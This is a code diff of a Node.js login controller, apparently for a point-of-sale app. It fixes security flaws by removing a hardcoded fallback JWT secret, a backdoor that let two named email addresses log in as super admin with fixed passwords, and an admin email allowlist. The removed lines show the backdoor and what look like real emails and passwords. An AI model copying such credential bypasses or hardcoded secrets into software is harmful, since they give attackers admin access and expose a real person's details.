@@ -11,9 +11,12 @@ const AuditLog = require('../models/AuditLog');
 
 // Helper to generate JWT token
 const generateToken = (id) => {
+  if (!process.env.JWT_SECRET) {
+    throw new Error('JWT_SECRET environment variable is missing');
+  }
   return jwt.sign(
     { id },
-    process.env.JWT_SECRET || 'storeflow-pos-secret-key-2026',
+    process.env.JWT_SECRET,
     {
       expiresIn: process.env.JWT_EXPIRES_IN || '7d',
     }
@@ -273,19 +276,7 @@ const loginUser = async (req, res) => {
     }
 
     // Check password
-    let isMatch = await user.matchPassword(password);
-    if (!isMatch && (user.role === 'PLATFORM_SUPER_ADMIN' || user.isPlatformAdmin)) {
-      if (
-        (cleanEmail === 'sharmila0774@gmail.com' || cleanEmail === 'sharmia0774@gmail.com') &&
-        (password === 'sharmi1234' || password === 'sharmi12345' || password === '12345678')
-      ) {
-        user.password = password;
-        if (typeof user.save === 'function') {
-          await user.save();
-        }
-        isMatch = true;
-      }
-    }
+    const isMatch = await user.matchPassword(password);
 
     if (!isMatch) {
       await LoginEvent.create({
@@ -444,8 +435,6 @@ const googleAuth = async (req, res) => {
     const adminAllowlist = [
       (process.env.PLATFORM_ADMIN_EMAIL || '').trim().toLowerCase(),
       (process.env.SEED_ADMIN_EMAIL || '').trim().toLowerCase(),
-      'sharmia0774@gmail.com',
-      'sharmila0774@gmail.com',
     ].filter(Boolean);
 
     let userQuery = User.findOne({ email: cleanEmail });
